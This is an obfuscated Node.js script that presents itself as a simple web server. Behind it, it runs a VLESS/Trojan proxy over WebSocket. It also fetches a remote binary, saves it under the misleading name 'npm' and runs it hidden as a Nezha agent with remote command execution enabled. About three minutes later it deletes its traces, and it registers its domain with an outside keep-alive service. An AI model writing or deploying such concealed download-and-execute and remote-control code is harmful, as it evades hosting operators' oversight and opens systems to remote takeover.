const _0x4737b4=_0x2444;function _0x3c2c(){const _0x28f587=['client_secret:\x20','http','8443','createHash','end','type','NAME','error:\x20','Failed\x20to\x20resolve\x20','includes','5500oOzByQ','isp','2087','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','&path=%2F','162BjXgbI','AUTO_ACCESS','NEZHA_KEY','url','index.html','then','write','substr','toString','text/plain','1203744mcQDSN','setsid\x20nohup\x20./npm\x20-s\x20','update','arm64','https://amd64.ssss.nyc.mn/agent','1411304HQDncn','arch','writeHead','application/json','log','&fp=chrome&type=ws&host=','createWriteStream','get','npm',':443?encryption=none&security=tls&sni=','country_code','config.yaml','Automatic\x20Access\x20Task\x20added\x20successfully','text/html','close','--tls','3151772hsRKdr','77oWLLzP','unlink','child_process','2083','join','UUID','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','vless://','1234.abc.com','false','split','listen','readUInt16BE','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','map','pipe','Server\x20is\x20running\x20on\x20port\x20','slice','2053','/bin/bash','2605370LTfMAM','aarch64','utf8','connect','1.1.1.1','error','find','base64','readUInt8','https://amd64.ssss.nyc.mn/v1','https://oooo.serv00.net/add-url','&type=A','reduce','NEZHA_PORT','length','from','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','connection','443','chmod\x20+x\x20npm','hex','application/dns-json','stream','trojan://','Hello\x20world!','sub','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','3352806tZGVMz','createServer','npm\x20running\x20error:','Answer','sha224','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','npm\x20is\x20already\x20running,\x20skip\x20running...','385380oXvRdb','utf-8','https://','env','npm\x20is\x20running','every','https://dns.google/resolve?name=','data','NEZHA_SERVER','npm\x20download\x20successfully','pop','replace','catch','Not\x20Found\x0a','message'];_0x3c2c=function(){return _0x28f587;};return _0x3c2c();}function _0x2444(_0x1f82f4,_0x16da36){_0x1f82f4=_0x1f82f4-0x180;const _0x3c2c8b=_0x3c2c();let _0x244461=_0x3c2c8b[_0x1f82f4];return _0x244461;}(function(_0x3053ca,_0x3ca87a){const _0x1c62dd=_0x2444,_0x457db8=_0x3053ca();while(!![]){try{const _0x1c4127=parseInt(_0x1c62dd(0x1e6))/0x1+parseInt(_0x1c62dd(0x181))/0x2+parseInt(_0x1c62dd(0x1c6))/0x3+parseInt(_0x1c62dd(0x196))/0x4+parseInt(_0x1c62dd(0x1ab))/0x5+-parseInt(_0x1c62dd(0x1cd))/0x6*(-parseInt(_0x1c62dd(0x197))/0x7)+parseInt(_0x1c62dd(0x186))/0x8*(-parseInt(_0x1c62dd(0x1eb))/0x9);if(_0x1c4127===_0x3ca87a)break;else _0x457db8['push'](_0x457db8['shift']());}catch(_0x2d017f){_0x457db8['push'](_0x457db8['shift']());}}}(_0x3c2c,0x89f5f));const os=require('os'),http=require(_0x4737b4(0x1dd)),fs=require('fs'),axios=require('axios'),net=require('net'),path=require('path'),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x4737b4(0x199)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x4737b4(0x1d0)][_0x4737b4(0x19c)]||'3552bdf3-0100-4a40-bb18-ae9a5a95b44c',NEZHA_SERVER=process[_0x4737b4(0x1d0)][_0x4737b4(0x1d5)]||'',NEZHA_PORT=process[_0x4737b4(0x1d0)][_0x4737b4(0x1b8)]||'',NEZHA_KEY=process['env'][_0x4737b4(0x1ed)]||'',DOMAIN=process[_0x4737b4(0x1d0)]['DOMAIN']||_0x4737b4(0x19f),AUTO_ACCESS=process[_0x4737b4(0x1d0)][_0x4737b4(0x1ec)]||!![],WSPATH=process['env']['WSPATH']||UUID[_0x4737b4(0x1a8)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||_0x4737b4(0x1c4),NAME=process['env'][_0x4737b4(0x1e2)]||'',PORT=process['env']['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x169627=_0x4737b4;try{const _0x18f819=await axios[_0x169627(0x18d)]('https://api.ip.sb/geoip'),_0x135cf4=_0x18f819['data'];ISP=(_0x135cf4[_0x169627(0x190)]+'-'+_0x135cf4[_0x169627(0x1e7)])[_0x169627(0x1d8)](/ /g,'_');}catch(_0x2e92e2){ISP='Unknown';}};GetISP();const httpServer=http[_0x4737b4(0x1c7)]((_0x52fda8,_0xa379e3)=>{const _0x27de99=_0x4737b4;if(_0x52fda8[_0x27de99(0x1ee)]==='/'){const _0x3a14b4=path['join'](__dirname,_0x27de99(0x1ef));fs['readFile'](_0x3a14b4,_0x27de99(0x1ad),(_0x2e1af3,_0xebdb0c)=>{const _0x2626ad=_0x27de99;if(_0x2e1af3){_0xa379e3[_0x2626ad(0x188)](0xc8,{'Content-Type':'text/html'}),_0xa379e3[_0x2626ad(0x1e0)](_0x2626ad(0x1c3));return;}_0xa379e3[_0x2626ad(0x188)](0xc8,{'Content-Type':_0x2626ad(0x193)}),_0xa379e3[_0x2626ad(0x1e0)](_0xebdb0c);});return;}else{if(_0x52fda8['url']==='/'+SUB_PATH){const _0x2be299=NAME?NAME+'-'+ISP:ISP,_0x3935de=_0x27de99(0x19e)+UUID+'@'+DOMAIN+_0x27de99(0x18f)+DOMAIN+_0x27de99(0x18b)+DOMAIN+_0x27de99(0x1ea)+WSPATH+'#'+_0x2be299,_0x14f234=_0x27de99(0x1c2)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x27de99(0x18b)+DOMAIN+_0x27de99(0x1ea)+WSPATH+'#'+_0x2be299,_0x1cbfa5=_0x3935de+'\x0a'+_0x14f234,_0x2209a4=Buffer[_0x27de99(0x1ba)](_0x1cbfa5)[_0x27de99(0x1f3)](_0x27de99(0x1b2));_0xa379e3['writeHead'](0xc8,{'Content-Type':_0x27de99(0x180)}),_0xa379e3[_0x27de99(0x1e0)](_0x2209a4+'\x0a');}else _0xa379e3[_0x27de99(0x188)](0x194,{'Content-Type':'text/plain'}),_0xa379e3['end'](_0x27de99(0x1da));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x4737b4(0x1d8)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x4737b4(0x1af)];function resolveHost(_0x53dc3c){return new Promise((_0x2bdb90,_0x2c27d2)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x53dc3c)){_0x2bdb90(_0x53dc3c);return;}let _0x29e4f7=0x0;function _0x2406b9(){const _0x144ed0=_0x2444;if(_0x29e4f7>=DNS_SERVERS['length']){_0x2c27d2(new Error(_0x144ed0(0x1e4)+_0x53dc3c+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x46e918=DNS_SERVERS[_0x29e4f7];_0x29e4f7++;const _0x1057ad=_0x144ed0(0x1d3)+encodeURIComponent(_0x53dc3c)+_0x144ed0(0x1b6);axios[_0x144ed0(0x18d)](_0x1057ad,{'timeout':0x1388,'headers':{'Accept':_0x144ed0(0x1c0)}})['then'](_0x8d0f7b=>{const _0x136ba3=_0x144ed0,_0x23c31b=_0x8d0f7b['data'];if(_0x23c31b['Status']===0x0&&_0x23c31b[_0x136ba3(0x1c9)]&&_0x23c31b[_0x136ba3(0x1c9)][_0x136ba3(0x1b9)]>0x0){const _0x77515a=_0x23c31b[_0x136ba3(0x1c9)][_0x136ba3(0x1b1)](_0x59accd=>_0x59accd[_0x136ba3(0x1e1)]===0x1);if(_0x77515a){_0x2bdb90(_0x77515a['data']);return;}}_0x2406b9();})[_0x144ed0(0x1d9)](_0xf9aeca=>{_0x2406b9();});}_0x2406b9();});}function handleVlessConnection(_0x2e468c,_0x27c333){const _0x2c5031=_0x4737b4,[_0x26758c]=_0x27c333,_0x3686a7=_0x27c333[_0x2c5031(0x1a8)](0x1,0x11);if(!_0x3686a7['every']((_0x40d8eb,_0x54ad9b)=>_0x40d8eb==parseInt(uuid[_0x2c5031(0x1f2)](_0x54ad9b*0x2,0x2),0x10)))return![];let _0x576b9e=_0x27c333['slice'](0x11,0x12)[_0x2c5031(0x1b3)]()+0x13;const _0x5d3ac1=_0x27c333[_0x2c5031(0x1a8)](_0x576b9e,_0x576b9e+=0x2)[_0x2c5031(0x1a3)](0x0),_0x2b868a=_0x27c333['slice'](_0x576b9e,_0x576b9e+=0x1)[_0x2c5031(0x1b3)](),_0x3b1082=_0x2b868a==0x1?_0x27c333['slice'](_0x576b9e,_0x576b9e+=0x4)[_0x2c5031(0x19b)]('.'):_0x2b868a==0x2?new TextDecoder()['decode'](_0x27c333[_0x2c5031(0x1a8)](_0x576b9e+0x1,_0x576b9e+=0x1+_0x27c333[_0x2c5031(0x1a8)](_0x576b9e,_0x576b9e+0x1)[_0x2c5031(0x1b3)]())):_0x2b868a==0x3?_0x27c333['slice'](_0x576b9e,_0x576b9e+=0x10)[_0x2c5031(0x1b7)]((_0x21b4d2,_0x4df3a2,_0x24a74e,_0x39fa1c)=>_0x24a74e%0x2?_0x21b4d2['concat'](_0x39fa1c[_0x2c5031(0x1a8)](_0x24a74e-0x1,_0x24a74e+0x1)):_0x21b4d2,[])['map'](_0x3e7a6f=>_0x3e7a6f[_0x2c5031(0x1a3)](0x0)['toString'](0x10))[_0x2c5031(0x19b)](':'):'';_0x2e468c['send'](new Uint8Array([_0x26758c,0x0]));const _0x5e188f=createWebSocketStream(_0x2e468c);return resolveHost(_0x3b1082)[_0x2c5031(0x1f0)](_0x4a95c0=>{const _0x4e2787=_0x2c5031;net[_0x4e2787(0x1ae)]({'host':_0x4a95c0,'port':_0x5d3ac1},function(){const _0x566bbb=_0x4e2787;this['write'](_0x27c333['slice'](_0x576b9e)),_0x5e188f['on'](_0x566bbb(0x1b0),()=>{})[_0x566bbb(0x1a6)](this)['on'](_0x566bbb(0x1b0),()=>{})[_0x566bbb(0x1a6)](_0x5e188f);})['on'](_0x4e2787(0x1b0),()=>{});})['catch'](_0x4216c8=>{const _0x3922f1=_0x2c5031;net[_0x3922f1(0x1ae)]({'host':_0x3b1082,'port':_0x5d3ac1},function(){const _0x10b06e=_0x3922f1;this[_0x10b06e(0x1f1)](_0x27c333[_0x10b06e(0x1a8)](_0x576b9e)),_0x5e188f['on'](_0x10b06e(0x1b0),()=>{})[_0x10b06e(0x1a6)](this)['on'](_0x10b06e(0x1b0),()=>{})[_0x10b06e(0x1a6)](_0x5e188f);})['on'](_0x3922f1(0x1b0),()=>{});}),!![];}function handleTrojanConnection(_0x366c7a,_0xdc748b){const _0x138f24=_0x4737b4;try{if(_0xdc748b[_0x138f24(0x1b9)]<0x3a)return![];const _0x25d160=_0xdc748b[_0x138f24(0x1a8)](0x0,0x38)[_0x138f24(0x1f3)](),_0x380ed4=[UUID];let _0x3772db=null;for(const _0x30c60c of _0x380ed4){const _0x3919c7=crypto[_0x138f24(0x1df)](_0x138f24(0x1ca))[_0x138f24(0x183)](_0x30c60c)['digest'](_0x138f24(0x1bf));if(_0x3919c7===_0x25d160){_0x3772db=_0x30c60c;break;}}if(!_0x3772db)return![];let _0x178563=0x38;_0xdc748b[_0x178563]===0xd&&_0xdc748b[_0x178563+0x1]===0xa&&(_0x178563+=0x2);const _0x3f091b=_0xdc748b[_0x178563];if(_0x3f091b!==0x1)return![];_0x178563+=0x1;const _0x3480df=_0xdc748b[_0x178563];_0x178563+=0x1;let _0x64d21,_0x1e58c4;if(_0x3480df===0x1)_0x64d21=_0xdc748b['slice'](_0x178563,_0x178563+0x4)[_0x138f24(0x19b)]('.'),_0x178563+=0x4;else{if(_0x3480df===0x3){const _0x3904fe=_0xdc748b[_0x178563];_0x178563+=0x1,_0x64d21=_0xdc748b[_0x138f24(0x1a8)](_0x178563,_0x178563+_0x3904fe)[_0x138f24(0x1f3)](),_0x178563+=_0x3904fe;}else{if(_0x3480df===0x4)_0x64d21=_0xdc748b['slice'](_0x178563,_0x178563+0x10)['reduce']((_0xd58adb,_0x61788f,_0x3ff757,_0x586124)=>_0x3ff757%0x2?_0xd58adb['concat'](_0x586124['slice'](_0x3ff757-0x1,_0x3ff757+0x1)):_0xd58adb,[])[_0x138f24(0x1a5)](_0x137eb8=>_0x137eb8['readUInt16BE'](0x0)[_0x138f24(0x1f3)](0x10))[_0x138f24(0x19b)](':'),_0x178563+=0x10;else return![];}}_0x1e58c4=_0xdc748b['readUInt16BE'](_0x178563),_0x178563+=0x2;_0x178563<_0xdc748b[_0x138f24(0x1b9)]&&_0xdc748b[_0x178563]===0xd&&_0xdc748b[_0x178563+0x1]===0xa&&(_0x178563+=0x2);const _0x2871c2=createWebSocketStream(_0x366c7a);return resolveHost(_0x64d21)['then'](_0x37fc2f=>{const _0x1947d6=_0x138f24;net[_0x1947d6(0x1ae)]({'host':_0x37fc2f,'port':_0x1e58c4},function(){const _0xf24bb9=_0x1947d6;_0x178563<_0xdc748b['length']&&this['write'](_0xdc748b[_0xf24bb9(0x1a8)](_0x178563)),_0x2871c2['on'](_0xf24bb9(0x1b0),()=>{})['pipe'](this)['on'](_0xf24bb9(0x1b0),()=>{})[_0xf24bb9(0x1a6)](_0x2871c2);})['on'](_0x1947d6(0x1b0),()=>{});})[_0x138f24(0x1d9)](_0x5e11db=>{const _0x3acfc7=_0x138f24;net[_0x3acfc7(0x1ae)]({'host':_0x64d21,'port':_0x1e58c4},function(){const _0x34fefb=_0x3acfc7;_0x178563<_0xdc748b[_0x34fefb(0x1b9)]&&this[_0x34fefb(0x1f1)](_0xdc748b['slice'](_0x178563)),_0x2871c2['on'](_0x34fefb(0x1b0),()=>{})[_0x34fefb(0x1a6)](this)['on']('error',()=>{})[_0x34fefb(0x1a6)](_0x2871c2);})['on'](_0x3acfc7(0x1b0),()=>{});}),!![];}catch(_0x1933a9){return![];}}wss['on'](_0x4737b4(0x1bc),(_0x30f082,_0x3c8063)=>{const _0x198752=_0x4737b4,_0x1c954e=_0x3c8063[_0x198752(0x1ee)]||'';_0x30f082['once'](_0x198752(0x1db),_0x3e7490=>{const _0x531ba6=_0x198752;if(_0x3e7490[_0x531ba6(0x1b9)]>0x11&&_0x3e7490[0x0]===0x0){const _0x6354f=_0x3e7490[_0x531ba6(0x1a8)](0x1,0x11),_0x339c2c=_0x6354f[_0x531ba6(0x1d2)]((_0x4824cc,_0x39b185)=>_0x4824cc==parseInt(uuid[_0x531ba6(0x1f2)](_0x39b185*0x2,0x2),0x10));if(_0x339c2c){!handleVlessConnection(_0x30f082,_0x3e7490)&&_0x30f082['close']();return;}}!handleTrojanConnection(_0x30f082,_0x3e7490)&&_0x30f082[_0x531ba6(0x194)]();})['on'](_0x198752(0x1b0),()=>{});});const getDownloadUrl=()=>{const _0x1be018=_0x4737b4,_0x2aab19=os[_0x1be018(0x187)]();return _0x2aab19==='arm'||_0x2aab19===_0x1be018(0x184)||_0x2aab19===_0x1be018(0x1ac)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x1be018(0x1b4):_0x1be018(0x185);},downloadFile=async()=>{const _0x4d79fa=_0x4737b4;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x6fa35=getDownloadUrl(),_0x11d9ac=await axios({'method':_0x4d79fa(0x18d),'url':_0x6fa35,'responseType':_0x4d79fa(0x1c1)}),_0x16b821=fs[_0x4d79fa(0x18c)](_0x4d79fa(0x18e));return _0x11d9ac[_0x4d79fa(0x1d4)][_0x4d79fa(0x1a6)](_0x16b821),new Promise((_0x2a72c9,_0x1ccd81)=>{const _0x554621=_0x4d79fa;_0x16b821['on']('finish',()=>{const _0x9dc609=_0x2444;console[_0x9dc609(0x18a)](_0x9dc609(0x1d6)),exec(_0x9dc609(0x1be),_0x5f08ce=>{if(_0x5f08ce)_0x1ccd81(_0x5f08ce);_0x2a72c9();});}),_0x16b821['on'](_0x554621(0x1b0),_0x1ccd81);});}catch(_0x4140ce){throw _0x4140ce;}},runnz=async()=>{const _0xdd2624=_0x4737b4;try{const _0x334560=execSync(_0xdd2624(0x1bb),{'encoding':_0xdd2624(0x1ce)});if(_0x334560['trim']()!==''){console['log'](_0xdd2624(0x1cc));return;}}catch(_0x36e7a9){}await downloadFile();let _0x5a36ce='',_0x470df4=[_0xdd2624(0x1bd),_0xdd2624(0x1de),'2096',_0xdd2624(0x1e8),_0xdd2624(0x19a),_0xdd2624(0x1a9)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x669933=_0x470df4[_0xdd2624(0x1e5)](NEZHA_PORT)?_0xdd2624(0x195):'';_0x5a36ce=_0xdd2624(0x182)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x669933+_0xdd2624(0x1e9);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x171f61=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0xdd2624(0x1a1)](':')[_0xdd2624(0x1d7)]():'',_0x8fe8e6=_0x470df4[_0xdd2624(0x1e5)](_0x171f61)?'true':_0xdd2624(0x1a0),_0x3d8490=_0xdd2624(0x1dc)+NEZHA_KEY+_0xdd2624(0x1cb)+NEZHA_SERVER+_0xdd2624(0x19d)+_0x8fe8e6+_0xdd2624(0x1a4)+UUID;fs['writeFileSync'](_0xdd2624(0x191),_0x3d8490);}_0x5a36ce=_0xdd2624(0x1c5);}else{console[_0xdd2624(0x18a)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x5a36ce,{'shell':_0xdd2624(0x1aa)},_0x3e54df=>{const _0x18b0cf=_0xdd2624;if(_0x3e54df)console[_0x18b0cf(0x1b0)](_0x18b0cf(0x1c8),_0x3e54df);else console[_0x18b0cf(0x18a)](_0x18b0cf(0x1d1));});}catch(_0x4f4a86){console[_0xdd2624(0x1b0)](_0xdd2624(0x1e3)+_0x4f4a86);}};async function addAccessTask(){const _0x361c97=_0x4737b4;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x44530b=_0x361c97(0x1cf)+DOMAIN;try{const _0x3f23f8=await axios['post'](_0x361c97(0x1b5),{'url':_0x44530b},{'headers':{'Content-Type':_0x361c97(0x189)}});console[_0x361c97(0x18a)](_0x361c97(0x192));}catch(_0x5ec5a8){}}const delFiles=()=>{const _0x57b2c7=_0x4737b4;fs['unlink'](_0x57b2c7(0x18e),()=>{}),fs[_0x57b2c7(0x198)]('config.yaml',()=>{});};httpServer[_0x4737b4(0x1a2)](PORT,()=>{const _0x195deb=_0x4737b4;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x195deb(0x18a)](_0x195deb(0x1a7)+PORT);});
